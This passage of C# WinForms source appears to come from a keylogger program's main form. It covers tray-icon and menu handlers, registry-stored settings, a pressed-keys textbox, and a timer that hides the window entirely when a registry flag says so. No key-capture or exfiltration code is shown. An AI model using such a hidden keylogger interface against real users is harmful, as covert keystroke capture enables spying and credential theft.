            notifyIcon1.ContextMenuStrip = contextMenuStrip_for_notifyicon;
            notifyIcon1.Text = " Open Keylogger";
            notifyIcon1.ShowBalloonTip ( 50, "Keylogger", "Keylogger is running in Open Mode", ToolTipIcon.Warning );
            notifyIcon1.DoubleClick += new EventHandler ( notifyIcon1_DoubleClick );
        }

        void notifyIcon1_DoubleClick ( object sender, EventArgs e )
        {
            if (this.Visible == true)
                this.Hide();
            else
            {

                this.Visible = true;
                this.Show();
                this.Size = new System.Drawing.Size(747, 520);
                this.FormBorderStyle = FormBorderStyle.Fixed3D;
                readwrite_registy.write("View", "Hide", "No");
            }
        }



        private void checkBox_notify_icon_CheckedChanged ( object sender, EventArgs e )
        {
            readwrite_registy.write ( "Setting", "NotifyIcon", checkBox_notify_icon.Checked.ToString ( ) );
            if ( checkBox_notify_icon.Checked )
            {
                shownotifyicon ( );
            }
            else
            {
                try
                {
                    notifyIcon1.Dispose ( );
                }
                catch
                {

                }
            }
        }

        private void openKeyloggerToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            if ( openKeyloggerToolStripMenuItem.Text == "Open Keylogger" )
            {
                this.Visible = true;
                this.Show();
                this.Size = new System.Drawing.Size(747, 520);
                this.FormBorderStyle = FormBorderStyle.Fixed3D;
                openKeyloggerToolStripMenuItem.Text = "Hide Keylogger";
                readwrite_registy.write("View", "Hide", "No");
            }
            else
            {
                this.Hide ( );
                openKeyloggerToolStripMenuItem.Text = "Open Keylogger";
                readwrite_registy.write("View", "Hide", "Yes");
            }
        }

        private void contextMenuStrip_for_notifyicon_Opening ( object sender, CancelEventArgs e )
        {
            if ( this.Visible == true )
                openKeyloggerToolStripMenuItem.Text = "Hide Keylogger";
            else
                openKeyloggerToolStripMenuItem.Text = "Open Keylogger";

            if ( newwindowalert == true )
                newWindowAlertToolStripMenuItem.Checked = true;
            else
                newWindowAlertToolStripMenuItem.Checked = false;
        }

        private void hideNotifyIconToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            try
            {
                notifyIcon1.Dispose ( );
                checkBox_notify_icon.Checked = false;
            }
            catch
            {

            }
        }

        private void newWindowAlertToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            if ( newWindowAlertToolStripMenuItem.Checked )
            {
                newWindowAlertToolStripMenuItem.Checked = false;
                newwindowalert = false;
                readwrite_registy.write ( "Setting", "NewWindowAlert", "False" );
            }
            else
            {
                newWindowAlertToolStripMenuItem.Checked = true;
                newwindowalert = true;
                readwrite_registy.write ( "Setting", "NewWindowAlert", "True" );

            }
        }

        private void contextMenuStrip_command_textbox2_Opening(object sender, CancelEventArgs e)
        {
            
            if (textBox_command2.Dock == DockStyle.Top)
            {
                showFullToolStripMenuItem.Visible = true;
            }
            else
            {
                showFullToolStripMenuItem.Visible = false;
            }
        }

        private void showFullToolStripMenuItem_Click(object sender, EventArgs e)
        {
            fullToolStripMenuItem_Click(sender, e);
        }

        private void Form1_VisibleChanged(object sender, EventArgs e)
        {
           

        //   MessageBox.Show(readwrite_registy.read ( "View", "Hide" ).ToString());
        }


        private void hideinfoform()
        {
            string hideinfo = "False";
            try
            {
                hideinfo = readwrite_registy.read("Settings", "Hideinfo");
            }
            catch
            {
                readwrite_registy.write("Settings", "Hideinfo", "False");
                hideinfo = "False";
            }
            if (hideinfo != "True")
            {
                hideinfo infohide = new hideinfo();
                infohide.Show();
            }
         
        }
        private void openHelpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Help hl = new Help();
            hl.Show();
        }

        private void visibilityToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (visibilityToolStripMenuItem.Checked)
            {

                visibilityToolStripMenuItem.Checked = false;
                tabControl1.Visible = false;
                label_key_to_accept.Visible = false;
                label_clear_key.Visible = false;
                textBox_command2.Visible = false;

            }
            else
            {
                visibilityToolStripMenuItem.Checked = true;
                tabControl1.Visible = true;
                label_key_to_accept.Visible = true;
                label_clear_key.Visible = true;
                textBox_command2.Visible = true;
            }
        }

        private void viewToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (tabControl1.Visible == true)
                visibilityToolStripMenuItem.Checked = true;

            else
                visibilityToolStripMenuItem.Checked = false;

            try
            {

                string hideinfo = "False";
                try
                {
                    hideinfo = readwrite_registy.read("Settings", "Hideinfo");
                }
                catch
                {
                    hideinfo = "False";
                }
                if (hideinfo == "False")
                    displayShowInfoToolStripMenuItem.Checked = true;
                else
                    displayShowInfoToolStripMenuItem.Checked = false;
            }
            catch
            {
                displayShowInfoToolStripMenuItem.Checked = false;
            }
        }

        private void matchCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (matchCommandToolStripMenuItem.Checked == true)
            {
                matchCommandToolStripMenuItem.Checked = false;
            }
            else
            {
                matchCommandToolStripMenuItem.Checked = true;
            }
            readwrite_registy.write("Settings", "MatchCommand", matchCommandToolStripMenuItem.Checked.ToString());
        }

        private void clearTextToolStripMenuItem_Click(object sender, EventArgs e)
        {
            textBox_all_pressed_key.Clear();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (readwrite_registy.read("View", "Hide").ToString() == "Yes")
            {
                this.Visible = false;
                this.Size = new Size(0, 0);
                this.Hide();
            }
            else
            {
                this.Visible = true;
                this.Show();
               
                this.FormBorderStyle = FormBorderStyle.Fixed3D;
                readwrite_registy.write("View", "Hide", "No");
                try
                {
                    string interfacestle = readwrite_registy.read("View", "Interface").ToString();
                    if (interfacestle == "Minimal")
                    {
                        this.Cursor = Cursors.SizeAll;
                        single_frame_only();

                    }
                    else
                    {
                        this.Size = new System.Drawing.Size(747, 520);
                    }

                }
                catch
                {
                }
           
                timer1.Stop();
            }

        }

        private void infoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            info inf = new info();
            inf.Show();

        }

        private void displayShowInfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (displayShowInfoToolStripMenuItem.Checked == true)
            {
                displayShowInfoToolStripMenuItem.Checked = true;
                readwrite_registy.write("Settings", "Hideinfo", "True");
            }
            else
            {
                displayShowInfoToolStripMenuItem.Checked =false;
                readwrite_registy.write("Settings", "Hideinfo", "False");
            }
        }

    
       
    }
}
